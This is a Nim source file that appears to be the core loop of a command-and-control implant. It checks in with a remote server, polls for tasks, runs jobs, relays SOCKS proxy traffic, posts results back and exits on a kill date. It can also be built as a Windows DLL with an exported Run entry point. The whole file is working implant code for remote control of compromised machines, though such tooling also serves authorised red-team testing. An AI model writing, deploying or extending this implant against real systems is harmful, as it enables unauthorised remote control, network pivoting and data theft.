import winim/lean
import algorithm
import asyncdispatch
import base64
import json
import tables
import deques
from strutils import split
import ../utils/http
import ../utils/checkin
import ../utils/config
import ../utils/job
import ../utils/task
import ../commands/socks

var curConfig = createConfig()
var runningJobs: seq[Job]
var socksMap: seq[SocksMsg]
var socks_open = initTable[string, SocksMsg]()
var socks_in* = initTable[int, SocksMsg]()
var socks_out = initTable[int, SocksMsg]()

proc error*(message: string, exception: ref Exception) =
    echo message
    echo exception.getStackTrace()

proc getTasks* : Future[(seq[Task], seq[SocksMsg])] {.async.} =
    var tasks: seq[Task]
    var socksMap: seq[SocksMsg]
    let taskJson = %*{"action" : "get_tasking", "tasking_size": -1, "socks": []}
    when not defined(release):
        echo "Attempting to get tasks"
    let data = when defined(AESPSK): $(taskJson) else: encode(curConfig.PayloadUUID & $(taskJson), true)
    when not defined(release):
        echo "Attempting to get tasks with this data: ", data
    let temp = when defined(AESPSK): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
    when defined(release):
        echo "decodeed temp: ", temp
    if(cmp(temp[0 .. 35], curConfig.PayloadUUID) != 0):
        when not defined(release):
            echo "Payload UUID is not matching up when getting tasks something is wrong..."
        return (tasks, socksMap)
    # https://nim-lang.org/docs/system.html#%5E.t%2Cint
    var resp = parseJson(temp[36 .. ^1])
    for jnode in getElems(resp["tasks"]):
        when defined(release):
            echo "jnode tasks: ", jnode
        tasks.add(Task(action: jnode["command"].getStr(), id: jnode["id"].getStr(), parameters: jnode["parameters"].getStr(), timestamp: jnode["timestamp"].getFloat()))
    if "socks" in resp:
        for jnode in getElems(resp["socks"]):
            when not defined(release):
                echo "jnode socks: ", jnode
            socks.sendToSocksIn(SocksMsg(ServerId: jnode["server_id"].getInt(), Data: jnode["data"].getStr(), Exit: jnode["exit"].getBool()))
            #socksMap.add(SocksMsg(ServerId: jnode["server_id"].getInt(), Data: jnode["data"].getStr(), Exit: jnode["exit"].getBool()))
            #if not socks_in.hasKey(jnode["server_id"].getInt()):
                #echo "We add the following to socks_in: ", jnode
                #socks_in[jnode["server_id"].getInt()] = (SocksMsg(ServerId: jnode["server_id"].getInt(), Data: jnode["data"].getStr(), Exit: jnode["exit"].getBool()))
    # Sort by tasks' timestamps to get most recent tasks
    tasks.sort(taskCmp)
    #result = tasks
    return (tasks, socksMap)
    when not defined(release):
        echo "Sorted result: ", $(result)

proc checkIn: Future[bool] {.async.} =
    var check = createCheckIn(curConfig)
    when not defined(release):
        echo "Checkin has been created: ", $(check)

    let data = when defined(AESPSK): checkintojson(check) else: encode(curConfig.PayloadUUID & checkintojson(check), true)
    try:
        # Send initial checkin and parse json response into JsonNode
        let temp = when defined(AESPSK): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
        when defined(release):
            echo "decoded temp: ", temp
        var resp = parseJson(temp[36 .. ^1])
        when not defined(release):
            echo "resp from checkin: ", resp
        if(cmp(resp["status"].getStr(), "success") == 0):
            when not defined(release):
                echo "Updated curConfig PayloadUUID ", curConfig.PayloadUUID, " to ", resp["id"].getStr()
            curConfig.PayloadUUID = resp["id"].getStr()
            result = true
        else:
            result = false
    except:
        let
            e = getCurrentException()
            msg = getCurrentExceptionMsg()
        echo "Inside checkIn, got exception ", repr(e), " with message ", msg
        error("stacktrace", e)
        result = false

# Determine during compile time if being compiled as a DLL export main proc
when appType == "lib":
    {.pragma: rtl, exportc, cdecl.}
else:
    {.pragma: rtl.}

proc main() {.async, rtl.} =
    while (not await checkIn()):
        let dwell = genSleepTime(curConfig)
        when not defined(release):
            echo "checkin is false"
            echo "dwell: ", dwell
        await sleepAsync(dwell)
    when not defined(release):
        echo "Checked in with curConfig of: ", $(curConfig)
    while true:
        if(checkDate(curConfig.KillDate)):
            quit(QuitSuccess)
        let gettasktuple = await getTasks()
        let tasks = gettasktuple[0]
        #try:
        #    socksMap = gettasktuple[1]
        #except:
        #    echo "socksMap aus gettasktuple geht nicht ", getCurrentExceptionMsg()     
        when not defined(release):
            echo "tasks: ", $(tasks)
            for sock in socksMap:
                echo ("ID: ", sock.ServerId, "Data: ", sock.Data, "Exit: ", sock.Exit)
            echo "inside base and runningJobs: ", $(runningJobs)
        let resJobLauncherTup = await jobLauncher(runningJobs, tasks, curConfig)
        # Update config and obtain running jobs
        runningJobs = resJobLauncherTup.jobs
        curConfig = resJobLauncherTup.newConfig
        socks_out = socks.getFromSocksOut() 
        #try:
        #    socksMap = resJobLauncherTup.socksMap
        #except:
        #    echo "socksMap aus resJobLauncherTup geht nicht ", getCurrentExceptionMsg()
        #try:
        #    for sock in socksMap:
        #        echo ("ID: ", sock.ServerId, "Data: ", sock.Data, "Exit: ", sock.Exit)
        #except:
        #    echo "die for Schleife geht nicht ", getCurrentExceptionMsg()
        
        when not defined(release):
            echo "running jobs from joblauncher: ", $(runningJobs)
        let postResptuple = await postUp(curConfig, runningJobs, socks_out)
        when not defined(release):
            echo "jobs returned from postUp: ", $(postResptuple.resSeq)
        runningJobs = postResptuple.resSeq
        when not defined(release):
            echo "runningJobs after setting it equal to postresptuple.resSeq: ", $(runningJobs)
            echo "postResp: ", postResptuple.postupResp
        socks_out.clear()
        socks_in.clear()
        let dwell = genSleepTime(curConfig)
        await sleepAsync(dwell)


when appType == "lib":
    proc NimMain() {.cdecl, importc.}

    proc Run(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): bool {.stdcall, exportc, dynlib.} =
        NimMain()
        waitFor main()
        return true
else:
    waitFor main()
